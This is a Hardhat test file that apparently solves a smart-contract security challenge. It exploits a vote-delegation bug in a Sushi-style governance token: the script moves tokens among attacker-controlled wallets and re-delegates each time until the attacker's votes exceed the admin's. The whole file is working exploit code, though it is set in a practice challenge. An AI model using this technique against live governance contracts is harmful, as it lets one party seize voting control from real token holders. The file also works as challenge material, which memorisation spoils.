import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";

const BN = BigNumber;
let precision = BN.from(10).pow(18);

let accounts: Signer[];
let attacker: Signer; // WLed address 1
let o1: Signer; // WLed address 2
let o2: Signer; // WLed address 3
let admin: Signer; // should not be used
let adminUser: Signer; // WLed address 4 - should not be used
let governanceToken: Contract;

/// preliminary state
before(async () => {
	accounts = await ethers.getSigners();
	[attacker, o1, o2, admin, adminUser] = accounts;

	// setting up governance token:
	let governanceTokenFactory = await ethers.getContractFactory(
		"NotSushiToken"
	);
	governanceToken = await governanceTokenFactory.connect(admin).deploy();

	// attacker sybil attack - got 3 controlled addresses WLed
	await governanceToken
		.connect(admin)
		.addWledAddresses([
			await adminUser.getAddress(),
			await attacker.getAddress(),
			await o1.getAddress(),
			await o2.getAddress(),
		]);

	await governanceToken
		.connect(admin)
		.mint(await adminUser.getAddress(), precision.mul(2_000));
	await governanceToken
		.connect(admin)
		.mint(await attacker.getAddress(), precision.mul(500));

	// adminUser delegates all votes to himself
	await governanceToken
		.connect(adminUser)
		.delegate(await adminUser.getAddress());
});

it("solves the challenge", async function () {
	let adminAddress = await adminUser.getAddress();
	let attackerAddress = await attacker.getAddress();
	let o1Address = await o1.getAddress();
	let o2Address = await o2.getAddress();

	// Transfer all but 1 gov token from main attacker to other attack wallet
	// Attacker delegates admin
	await governanceToken
		.connect(attacker)
		.transfer(o1Address, precision.mul(499));
	await governanceToken.connect(attacker).delegate(adminAddress);

	// Transfer all gov tokens received at other attack wallet back to main attacker.
	// Attacker delegates attacker
	await governanceToken
		.connect(o1)
		.transfer(attackerAddress, precision.mul(499));
	await governanceToken.connect(attacker).delegate(attackerAddress);

	// Transfer 1 gov token from main attacker to other attack wallet
	// Other attack wallet delegates admin
	await governanceToken
		.connect(attacker)
		.transfer(o1Address, precision.mul(1));
	await governanceToken.connect(o1).delegate(adminAddress);

	// Transfer all remaining gov tokens from main attacker to other attack wallet.
	// Other attack wallet delegates attacker
	await governanceToken
		.connect(attacker)
		.transfer(o1Address, precision.mul(499));
	await governanceToken.connect(o1).delegate(attackerAddress);

	// Transfer all gov tokens from other attacker wallet to a third attack wallet.
	// Third attack wallet delegates attacker
	await governanceToken.connect(o1).transfer(o2Address, precision.mul(500));
	await governanceToken.connect(o2).delegate(attackerAddress);
});

/// expected final state
after(async () => {
	// attacker gets more delegated votes than adminUser
	let adminUserCount = await governanceToken.getCurrentVotes(
		await adminUser.getAddress()
	);
	let attackerCount = await governanceToken.getCurrentVotes(
		await attacker.getAddress()
	);
	expect(attackerCount).to.be.gt(adminUserCount);
});
